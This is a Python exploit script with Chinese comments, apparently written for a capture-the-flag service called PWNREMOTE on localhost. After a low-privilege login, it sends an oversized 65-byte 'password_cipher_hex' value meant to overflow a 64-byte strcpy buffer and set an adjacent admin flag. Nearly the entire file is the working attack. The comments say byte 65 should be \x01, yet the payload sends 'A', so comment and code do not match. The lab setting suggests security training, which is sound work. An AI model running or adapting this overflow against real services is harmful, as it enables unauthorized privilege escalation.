import socket
import json
import struct

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9000

LOW_USERNAME = "user"
LOW_PASSWORD = "123456" # 如果 server config 没设密码，这里可能需要置空或根据环境调整
ADMIN_USERNAME = "admin"
BANNER = b"PWNREMOTE/1.0 READY"

# --- 辅助函数 (保持不变) ---
def build_cmd(cmd, args):
    return {"type": "CMD", "cmd": cmd, "args": args}

def send_frame(sock, payload_dict):
    # 注意：ensure_ascii=True 会把不可见字符转义为 \uXXXX，服务器端的 JSON 解析器通常能自动还原为单字节
    json_data = json.dumps(payload_dict, separators=(",", ":"), ensure_ascii=True).encode("utf-8")
    length_header = struct.pack("!I", len(json_data))
    sock.sendall(length_header + json_data)

def recv_all(sock, size):
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk: return None
        data.extend(chunk)
    return bytes(data)

def recv_frame(sock):
    header = recv_all(sock, 4)
    if not header: return None
    length = struct.unpack("!I", header)[0]
    if length == 0: return b""
    return recv_all(sock, length)

def try_recv_frame(sock):
    try:
        return recv_frame(sock)
    except (socket.timeout, OSError):
        return None

def discard_banner(sock):
    try:
        sock.settimeout(0.2)
        peek = sock.recv(len(BANNER), socket.MSG_PEEK)
        if peek.startswith(BANNER):
            sock.recv(len(BANNER))
    except (socket.timeout, OSError):
        pass

# --- 攻击逻辑 ---

def debug_exploit():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        sock.connect((TARGET_IP, TARGET_PORT))
        print(f"[+] Connected to {TARGET_IP}:{TARGET_PORT}")
        discard_banner(sock)

        # 第一步：正常登录低权限账号
        # 必须先由 Guest -> Low 才能调用 LOGIN_HIGH
        print("[*] Step 1: LOGIN_LOW...")
        send_frame(sock, build_cmd("LOGIN_LOW", {"username": LOW_USERNAME, "password": LOW_PASSWORD}))
        resp_low = try_recv_frame(sock)
        print(f"[+] Response: {resp_low}")
        
        if not resp_low or b"ok\":true" not in resp_low:
            print("[-] LOGIN_LOW failed. Check credentials.")
            return

        # 第二步：构造 Payload 进行变量覆盖
        print("[*] Step 2: LOGIN_HIGH with raw payload...")

        # [ 漏洞原理 ]
        # buffer 是 char cipherBuf[64];
        # 后面紧接着 volatile int admin;
        # 我们填满 64 字节，第 65 字节写入 \x01。
        # strcpy 会自动补 \x00 在第 66 字节。
        # 结果: admin = 0x00000001 (Little Endian)
        
        # 注意：这里我们构造的是原始字符串，利用 JSON 的 \u0001 转义特性
        # 只要不是合法的 Hex 串，HexToBytes 就会失败，从而进入 return local.admin 的路径
        
        payload_str = "A" * 65

        
        login_high_req = build_cmd("LOGIN_HIGH", {
            "username": ADMIN_USERNAME, 
            # 关键：这里直接传字符串 Payload，不要再做 hex 编码
            "password_cipher_hex": payload_str 
        })
        
        send_frame(sock, login_high_req)
        
        resp_high = try_recv_frame(sock)
        print(f"[+] LOGIN_HIGH Response: {resp_high}")

        # 第三步：验证结果
        if resp_high:
            print("[*] LOGIN_HIGH response received.")
        else:
            print("[-] No response from server.")

        sock.close()

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    debug_exploit()
